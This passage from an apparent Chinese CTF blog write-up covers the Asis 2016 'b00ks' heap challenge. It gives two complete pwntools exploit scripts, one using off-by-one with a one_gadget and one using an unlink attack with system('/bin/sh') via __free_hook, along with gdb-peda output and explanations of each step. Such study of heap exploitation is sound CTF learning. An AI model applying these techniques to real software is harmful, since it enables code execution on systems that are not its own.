book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">48</span>, <span class="string">'1a'</span>, <span class="number">240</span>, <span class="string">'1b'</span>) <span class="comment">#1</span></span><br><span class="line">    create(<span class="number">0x21000</span>, <span class="string">'2a'</span>, <span class="number">0x21000</span>, <span class="string">'2b'</span>)<span class="comment">#2</span></span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    first_heap = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">    io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">    libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    offset = <span class="number">0x45216</span> </span><br><span class="line">    offset = <span class="number">0x4526a</span> </span><br><span class="line">    <span class="comment">#offset = 0xf02a4 </span></span><br><span class="line">    <span class="comment">#offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + offset</span><br><span class="line">    io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">    io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br><span class="line">    payload = p64(free_hook)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>我只讲解exp函数内的内容，外面的那些只是为了方便堆块的申请，输出，删除什么的，堆题建议都写成函数，因为将会有大量重复动作</p>
<h5 id="填满author"><a href="#填满author" class="headerlink" title="填满author"></a>填满author</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>
<p>具体查找author位置可以跟我一样，find 字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find author</span><br><span class="line">Searching for 'author' in: None ranges</span><br><span class="line">Found <span class="number">8</span> results, display max <span class="number">8</span> items:</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed905a</span> --&gt; <span class="number">0xa160726f68747561</span> </span><br><span class="line">    [<span class="built_in">stack</span>] : <span class="number">0x7ffed60b6406</span> (<span class="string">"author name: "</span>)</span><br></pre></td></tr></table></figure>

<p>这是创建一个堆块过后的效果，第三行便是book1结构体地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x555b3bed905a</span><span class="number">-0x2</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x555b3bed9040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555b3bed9050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x726f687475616161</span></span><br><span class="line"><span class="number">0x555b3bed9060</span>:	<span class="number">0x0000555b3bf8a160</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<h5 id="创建堆块1"><a href="#创建堆块1" class="headerlink" title="创建堆块1"></a>创建堆块1</h5><p>相信我，这里是这道题最难的地方，过了这个坎就很简单了，每个人环境不同，处理的结果也不一样，所以自行调试，在这里我能给你的建议就是将description申请大一点，泄露部分不需要这里大小控制，先不讲，你先调试到能泄露就行</p>
<h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><p>这个不多讲</p>
<h5 id="通过edit伪造book结构体"><a href="#通过edit伪造book结构体" class="headerlink" title="通过edit伪造book结构体"></a>通过edit伪造book结构体</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure>
<p>这前面的偏移是看个人环境的，网上的很多没有偏移，在我电脑环境上做不到，我通过这个偏移能刚好对齐，具体调试过程就是繁杂的了，总之，你要让你覆盖掉堆块1的地址那部分，刚好在book1的description指针指向的空间里，这样你才能自行伪造结构体<br>比如<br>我泄露出来的第一个堆块地址为这个[+] first_heap: 0x55b6b5d72160<br>那这时候我覆盖过后地址就变成[+] first_heap: 0x55b6b5d72100，你要让0x55b6b5d72100在description指向的空间内就成了，建议将description申请的大一些，这样容易做到，这部分跟创建堆块1是结合起来的，你看我创建的大小在你那不一定准确</p>
<h5 id="这时候再次利用off-by-one"><a href="#这时候再次利用off-by-one" class="headerlink" title="这时候再次利用off by one"></a>这时候再次利用off by one</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>
<p>将地址最低位覆盖成\x00,这样我们我们的那个堆块1的指针就指向了我们自己伪造的结构体了，这个结构体description和name我们指向了book2结构体，这样我们通过编辑堆块1的description就能改掉book2的结构体的description指针和name指针，我们能编辑book2的description，相当于任意写了</p>
<h5 id="这里部分就只是泄露了"><a href="#这里部分就只是泄露了" class="headerlink" title="这里部分就只是泄露了"></a>这里部分就只是泄露了</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">offset = <span class="number">0x45216</span> </span><br><span class="line">offset = <span class="number">0x4526a</span> </span><br><span class="line"><span class="comment">#offset = 0xf02a4 </span></span><br><span class="line"><span class="comment">#offset = 0xf1147</span></span><br><span class="line">one_gadget = libc_base + offset</span><br><span class="line">io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure>

<p>这里那个固定偏移，第一部分libc_base我是通过vmmap获得libc基地址，然后我调试的时候减一下就获得这个固定偏移了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line"><span class="number">0x0000564350ee5000</span> <span class="number">0x0000564350ee7000</span> r-xp	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e6000</span> <span class="number">0x00005643510e7000</span> r--p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e7000</span> <span class="number">0x00005643510e8000</span> rw-p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x0000564351cdd000</span> <span class="number">0x0000564351cff000</span> rw-p	[heap]</span><br><span class="line"><span class="number">0x00007f2805862000</span> <span class="number">0x00007f2805a22000</span> r-xp	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805a22000</span> <span class="number">0x00007f2805c22000</span> ---p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c22000</span> <span class="number">0x00007f2805c26000</span> r--p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c26000</span> <span class="number">0x00007f2805c28000</span> rw-p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c28000</span> <span class="number">0x00007f2805c2c000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805c2c000</span> <span class="number">0x00007f2805c52000</span> r-xp	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e0a000</span> <span class="number">0x00007f2805e51000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805e51000</span> <span class="number">0x00007f2805e52000</span> r--p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e52000</span> <span class="number">0x00007f2805e53000</span> rw-p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e53000</span> <span class="number">0x00007f2805e54000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007ffd06df4000</span> <span class="number">0x00007ffd06e15000</span> rw-p	[<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0x00007ffd06edc000</span> <span class="number">0x00007ffd06edf000</span> r--p	[vvar]</span><br><span class="line"><span class="number">0x00007ffd06edf000</span> <span class="number">0x00007ffd06ee1000</span> r-xp	[vdso]</span><br></pre></td></tr></table></figure>
<p>在heap下面权限为r-xp的start部分的地址就是libc基地址了，<br>然后任选一个泄露的<br>[+] book2 name addr: 0x7f2805e2c010<br>[+] book2 des addr: 0x7f2805e0a010<br>我选了description部分的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (<span class="keyword">default</span>, Apr  <span class="number">6</span> <span class="number">2019</span>, <span class="number">01</span>:<span class="number">42</span>:<span class="number">57</span>) </span><br><span class="line">[GCC <span class="number">8.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x7f2805e0a010</span><span class="number">-0x00007f2805862000</span>)</span><br><span class="line">'0x5a8010'</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>就是这个固定偏移了</p>
<p>至于libc跟one_gadget偏移，用工具吧one_gadget</p>
<h5 id="最后任意地址写"><a href="#最后任意地址写" class="headerlink" title="最后任意地址写"></a>最后任意地址写</h5><ol>
<li>先编辑book1的description改成free_hook地址，就是将book2的description指针指向free_hook</li>
<li>编辑book2的description，就是写入one_gadget了</li>
<li>最后在调用一次free就可以getshell了<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h4 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h4><p>void unlink(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</p>
<p>{</p>
<pre><code>FD = P-&gt;fd;

BK = P-&gt;bk;

FD-&gt;bk = BK;

BK-&gt;fd = FD;</code></pre><p>}<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解原理</a><br>我觉得那张图配的十分好，就是双向链表的解链过程，好好理解，不理解没法搞下去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> pre_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *fd; <span class="comment">//前驱指针 forward</span></span><br><span class="line">    <span class="keyword">char</span> *bk; <span class="comment">// 后继指针 back</span></span><br><span class="line">    数据部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这样，我创建三个这个结构体，a,b,c连接部分如下图，<br>链表： a&lt;-&gt;b&lt;-&gt;c<br>将b从链表中解链就是unlink<br>过程：</p>
<ol>
<li>FD = b-&gt;fd; //实际就是FD=a</li>
<li>BK = b-&gt;bk; //实际就是BK=c</li>
<li>FD-&gt;bk = BK; //就是从a-&gt;b变成a-&gt;c</li>
<li>BK-&gt;fd = FD; //就是从c-&gt;b变成c-&gt;a</li>
</ol>
<p>那unlink为什么能利用，进行攻击呢？我也纠结了这个很久，从ctf-wiki上了解的过去的unlink就不讲了，那时候的攻击方式比较简单，我只讲现今的unlink攻击方式<br>我们可以通过伪造chunk，让他解链的时候unlink一个我们伪造的chunk，这样的话，我们实际就达到了一个赋值的效果，而具体的效果从例子中讲解吧</p>
<h5 id="unlink攻击过程"><a href="#unlink攻击过程" class="headerlink" title="unlink攻击过程"></a>unlink攻击过程</h5><ol>
<li>利用off-by-one覆盖掉结果的null字节，泄露第一个堆块的地址</li>
<li>泄露掉后利用unlink，使得堆块4的mem部分的指针指向ptr-0x18处，ptr-0x18为自定义的地址，其实就是堆块4，就是create出来的那个堆块</li>
<li>覆盖堆块4的内容，修改了堆块4的description的指针，指向了堆块6的description部分的指针</li>
<li>其实第三部分就相当于获得了一个任意地址读写的指针</li>
<li>这里有好几次修改容易绕晕，我绕了两天才绕出来，第一次修改的时候是将chunk4整体改写，从开头到description指针，全部改掉，将chunk4的description指向chunk6结构体的description</li>
<li>然后第二次编辑的时候就是编辑chunk6结构体的description，这样就可以修改chunk6的description指针指向任意地点</li>
<li>利用这个特性输出，输出了libc的地址，具体libc在哪个位置可以通过调试得到</li>
<li>利用这个特性任意地址写<br>先对整体过程有个大概的了解，在一步步讲</li>
</ol>
<h5 id="过程中的坑"><a href="#过程中的坑" class="headerlink" title="过程中的坑"></a>过程中的坑</h5><ol>
<li>开头remove两次是有原因的，这样会让堆块6的结构体在前面几个堆块内，因为堆块同样大小的在free过后在malloc后会再次利用，这样方便我们自己调试查看以及利用</li>
<li>调试时候的计算问题，可以用你当时调试出来的减去后两位数字，获得个heap_base这样直接利用heap_base + 偏移比较快计算结果</li>
<li>当申请不是16的整数倍的时候，他会转换成16的整数倍，比如我exp中的0x108，实际大小会变成111，还有个1是标记的，他会将下一个chunk的pre_size拿来使用，因为没有free的话，pre_size是没用的，为了不浪费空间，就使用了</li>
</ol>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">    printf()</span><br><span class="line">    io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">    first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">    heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">    ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    remove(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">    printf()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()</span><br><span class="line">    io.info(content)</span><br><span class="line">    libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
